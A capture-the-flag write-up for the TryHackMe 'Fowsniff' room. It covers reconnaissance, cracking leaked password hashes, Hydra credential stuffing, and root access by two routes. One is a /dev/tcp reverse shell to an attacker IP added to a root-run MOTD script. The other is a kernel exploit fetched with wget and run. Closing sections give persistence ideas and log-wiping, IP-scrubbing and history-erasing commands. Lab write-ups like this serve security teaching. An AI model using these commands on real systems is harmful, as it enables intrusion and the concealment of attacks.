---
title: "fowsniff-ctf"
subtitle: "CTF room: https://tryhackme.com/room/ctf"
category: "CTF"
tags: ctf,nmap,gobuster,dirbuster,session,broken-authentication,javascript,apache,ubuntu,john,gpg2john,linpeas,privesc,cron
---
# fowsniff-ctf

URL: [https://tryhackme.com/room/ctf](https://tryhackme.com/room/ctf) &nbsp;<span class="badge rounded-pill bg-success" title="This is an Easy difficulty room."><i class="fa fa-bolt"></i>&nbsp;Easy</span>

## PHASE 1: Reconnaissance

Description of the room:

> This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

## PHASE 2: Scanning & Enumeration

### Running: `nmap`

Ran the following:

> `nmap -sCV x.x.x.x`

Interesting ports found to be open:

```python
PORT   STATE SERVICE REASON
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP CAPA SASL(PLAIN) RESP-CODES AUTH-RESP-CODE USER UIDL
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: more ENABLE Pre-login IMAP4rev1 post-login LOGIN-REFERRALS IDLE have listed LITERAL+ SASL-IR AUTH=PLAINA0001 capabilities ID OK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x`

Interesting folders found:

```python
/images               (Status: 301) [Size: 313] [--> http://10.10.163.38/images/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.163.38/assets/]
```

Also see: [gobuster.log](gobuster.log)

### Running: `nikto`

Ran the following:

> `nikto -h x.x.x.x`

Interesting info found:

```python
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ /: Server may leak inodes via ETags, header found with file /, inode: a45, size: 5674fd157f6d0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /images/: Directory indexing found.
+ /LICENSE.txt: License file found may identify site software.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
```

Also see: [nikto.log](nikto.log)

### Exploration

The website is for Fowsniff Corp which describes that it had a data breach. The room questions on TryHackMe asks if anything is google-able. We can find that there is a twitter account, and specifically this post:

> <https://twitter.com/FowsniffCorp/status/972208944285388800>

That points to pastebin:

> <https://pastebin.com/378rLnGi>

For Terms of Service reason, the breach data isn't here, but it looks like it's mirrored in two places (as of this writing):

1. <https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt>
2. <https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX>

That shows us a username:password dump of this:

```text
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

#### Cut Up The Data

So that we can work with this a bit easier let's pull the usernames out into a [users.txt](users.txt) file, and (what look like MD5) hashes to [hashes.txt](hashes.txt) using some command-line magic. But first, let's save this data into [breach.txt](breach.txt).

```bash
# Output the contents of breach.txt, pipe that to cut
# - Cut will use a ":" delimiter to split the line into field 1 and field 2.
#   We want field 1, the "user@host" entries.
#   - Cut will use a "@" delimiter to split the "user@host" format into field 1 and field 2
#     We want field 1, the usernames, alone.
cat ./breach.txt | cut -d ":" -f1 | cut -d "@" -f1 > users.txt

# Output the contents of breach.txt, pipe that to cut
# - Cut will use a ":" delimiter to split the line into field 1 and field 2. 
#   We want field 2, the hashes.
cat ./breach.txt | cut -d ":" -f2 > hashes.txt
```

#### Check the MD5 hashes

We can navigate to a site like:

> <https://crackstation.net/>

Paste in our 9 hashes and find out that 8 out of the 9 are cracked! For organization purposes, I'll put those in-order passwords into a [passwords.txt](passwords.txt). Then, I'll combine the original usernames with these passwords into one file called [accounts.txt](accounts.txt), using VS Code. That gives me this account data in all the formats I might need.

#### Credential Stuffing

Since we know several usernames and passwords, let's see if any of them work. Since we have [accounts.txt](accounts.txt) in a `username:password` format, we can use Hydra for this. The `-C` argument will take in a file in this format and just try each combination of `username:password` in the file.

Put another way, we can have hydra connect to a service (e.g. ssh, a web form, a pop3 server, etc) and try each `username:password` combination to see if any of them work. That is, unless you want to manually copy and paste and do them by hand!?

##### Credential Stuffing against `ssh`

```bash
hydra -C ./accounts.txt -vV 10.10.10.10 ssh
```

Alas, we see 9 attempts and none of those seem to work.

##### Credential Stuffing against `pop3`

You might remember that `nmap` showed that port `110` was open, which is the POP3 port. Hydra does know how to log into that service, so we can do credential stuffing here, too:

```bash
hydra -C ./accounts.txt -vV 10.10.10.10 pop3
```

We have ONE account (`seina`) that does have a working password. That should mean that we can read their e-mails, if that will help?

#### Reading POP3 Email

Post Office Protocol v3 (POP3) is a very old protocol from the 1980's(?) where everything is text-based. In this case, we're going to connect to port `110` and issue a series of commands. Here's a summary:

1. Initiate a connection with Netcat via `nc $TARGET 110`
1. Type: `USER seina` <kbd>Enter</kbd>
1. Type: `PASS <The Password You Retrieved>` <kbd>Enter</kbd>
1. Type: `LIST` <kbd>Enter</kbd>

This will show there are two e-mails in their Inbox:

```pop3
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
```

To view them:

1. Type: `RETR 1` <kbd>Enter</kbd> to see the first e-mail. Select that text and save it as [email_1.txt](email_1.txt).
1. Type: `RETR 2` <kbd>Enter</kbd> to see the second e-mail. Select that text and save it as [email_2.txt](email_2.txt).

Reading these e-mails, it looks like everyones account password was reset to the same, hard-coded password and everyone needed to change their password upon first login.

I wonder if everyone had a chance to login? What if there are accounts that are still set to this fixed, hard-coded password? Well, we can use Hydra for that, too:

```bash
hydra -L ./users.txt -p S1ck3nBluff+secureshell $TARGET ssh
```

The `-L` is going to use [users.txt](users.txt) for a list of usernames to try, and for each of those users it's going to try the fixed `-p` password specified.

Huzzah! It looks like the `baksteen` user still has this fixed password for SSH, so we should be able to log in as them.

## PHASE 3: Gaining Access & Exploitation

Using the information above, we can SSH in as `backsteen` with:

```bash
ssh backsteen@10.10.10.10
```

When prompted for a password, it's the password specified in [email_1.txt](email_1.txt). We notice we get a Message of the Day (MOTD) banner:

```text
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.

```

### Unprivileged Access

Taking a look around, using `sudo -l`, we do not have any `sudo` access. If we type `groups`, we can see we are in a group called `users`. Let's see if that group gives us any permissions?

We can search the file system (`/`) for files (`-type f`) that are owned by this group (`-group users`):

```bash
find / -group users -type f 2>/dev/null
```

> **TIP:** The `2>/dev/null` is a way to say if there are errors, then just discard them. When we, as unprivileged users attempt to search the entire file system, we will get gazillions of error messages. So, this syntax gives us a cleaner output.
{: .prompt-tip }

We see that we own an odd file: `/opt/cube/cube.sh`. The contents look familiar:

```bash
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

It would appear that whenever someone SSH's into this machine, some part of that MOTD will run this script, likely as `root`. In fact, we can verify that via:

```bash
cat /etc/update-motd.d/00-header
```

That shows:

```bash
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#       # Fall back to using the very slow lsb_release utility
#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```

That very last line.

### Privilege Escalation / Privileged Access

There are at least two ways to get `root` on this box.

#### OPTION 1: Use command injection on the MOTD/cube.sh

Since we have the ability to modify this `cube.sh` file, what if we had a kill-chain of:

1. Start Netcat listening on our machine on port 9000 via `nc -lvnp 9000`
2. Add a [one-liner reverse shell](https://www.revshells.com/) to the end of this file, like: `sh -i >& /dev/tcp/10.6.90.119/9000 0>&1`
3. Login via SSH again to trigger the reverse shell to run.

In theory, the SSH login should trigger the Message of the Day (MOTD), which should run `cube.sh` (as `root`) which should create a reverse shell connection to our awaiting Netcat.

#### OPTION 2: Use ExploitDB to take advantage of old OS kernel

In this approach, we see the OS information and the Linux Kernel information:

```bash
# Show OS info
cat /etc/os-release

# Show Kernel info
uname -a
```

That results in:

```text
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.4 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

and

```text
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

respectively. So, we know we're running **Ubuntu 16.04.4** and Linux Kernel version **4.4.0-116** - both of these are from the year 2016.

We can search for that in ExploitDB or via the CLI via `searchsploit`:

```bash
searchsploit linux kernel 4.4.0-116
```

That gives me several options, but one exact match for OS and Kernel (44298):

```text
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01)  | solaris/local/15962.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora | linux/local/9479.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local  | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE'  | linux/local/41995.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCC | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privile | linux/local/41886.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_k | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privi | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double so | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Over | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora  | linux/local/45010.c
Linux Kernel < 4.14.rc3 - Local Denial of Ser | linux/dos/42932.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR A | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_da | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Fre | linux/dos/44579.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - L | linux/local/44298.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu  | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/1 | linux/local/47169.c
Linux Kernel < 4.5.1 - Off-By-One (PoC)       | linux/dos/44301.c
---------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

The kill-chain here would be:

1. Copy the file to my local directory via: `cp /usr/share/exploitdb/exploits/linux/local/44298.c ./`
1. Compile the program with static-linking and produce a file called `44298-exploit` via: `gcc -static ./44298.c -o 44298-exploit`
1. Run a web server from this folder on port 8000 via: `python -m http.server 8000`
1. On the target machine:
   1. Download the file from our computer via: `wget http://10.6.90.119:8000/44298-exploit`
   2. Mark that newly-downloaded file on the target machine as executable via: `chmod +x ./44298-exploit`
   3. Run it: `./44298-exploit`

We see this output:

```bash
baksteen@fowsniff:~$ ./44298-exploit
task_struct = ffff88001f28c600
uidptr = ffff880015f3d6c4
spawning root shell
root@fowsniff:~# 
```

If we look in `/home/stone/` we do see a `.sudo_as_admin_successful` which means that `stone` has `sudo` privileges, which means there is probably yet another way to root this box.

## PHASE 4: Maintaining Access & Persistence

This is a test/CTF machine, so this is out of scope. However, in a Red Team scenario, we could:

- Add SSH key to `/root/.ssh/authorized_keys`
- Create a privileged account that wouldn’t draw attention (ex: `operations`) or an unprivileged account and give it `sudo` access via group or directly in the `/etc/sudoers` file.
- Install some other backdoor or service.

## PHASE 5: Clearing Tracks

This is a test/CTF machine, so this is out of scope. However, in a Red Team scenario, we could:

### Delete Logs

Delete relevant logs from `/var/log/` - although that might draw attention.

```bash
rm -Rf /var/log/*
```

### Replace our IP

Search and replace our IP address in all logs.

#### OPTION 1: Simple

The simplest way is via something like:

```bash
find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {} \;
```

This searches for all files under `/var/log/` and for each file found, searches for `10.10.2.14` (replace this with your IP) and and replace anywhere that is found with `127.0.0.1`.

#### OPTION 2: Complex

You could come up with your own scheme. For example, you could generate a random IP address with:

```bash
awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'
```

I'd like this to use a new, unique, random IP address for every instance found, but `sed` doesn't support command injection in the search/replace operation. However, you could generate a random IP address to a variable and use that for this search and replace, like below. Note that the `2> /dev/null` hides any error messages of accessing files.

##### As separate statements

In case you want to work out each individual piece of this, here they are as separate statements:

```bash
# MY IP address that I want to scrub.
srcip="22.164.233.238"

# Generate a new, unique, random IP address
rndip=`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`

# Find all files and replace any place that you see my IP, with the random one.
find /var/log -name "*" -exec sed -i "s/$srcip/$rndip/g" {} \; 2> /dev/null
```

##### As one ugly command

This is something you could copy/paste, and just change your IP address.

Basically, just set your `srcip` to your workstations' IP first, and MAKE SURE to run this with a space prefixed, so this command doesn't get written to the shell's history files (e.g. `~/.bash_history`, `~/.zsh_history`, etc.)

```bash
 srcip="10.10.10.10" ; find /tmp -name "*" -exec sed -i "s/$srcip/`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`/g" {} \; 2>/dev/null
```

or optionally, start a new shell, turn off command history, AND start the command with a space prefixed (which also should not add the command to the shell history), then exit out of that separate process:

```bash
bash
unset HISTFILE
 srcip="10.10.10.10" ; find /tmp -name "*" -exec sed -i "s/$srcip/`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`/g" {} \; 2>/dev/null
exit
```

The key idea here is that hiding your address from the logs would be pointless if the *command* for hiding your address from the logs were in a log some place!

### Wipe shell history

For any accounts that we used, if we don't mind that this will destroy valid entries of the user too (and give them an indication their account was compromised), run a comand like this with `tee` writing out nothing/null to multiple files at once:

```bash
cat /dev/null | tee /root/.bash_history /home/kathy/.bash_history /home/sam/.bash_history
```

## Summary

Completed: [2023-09-29 05:11:26]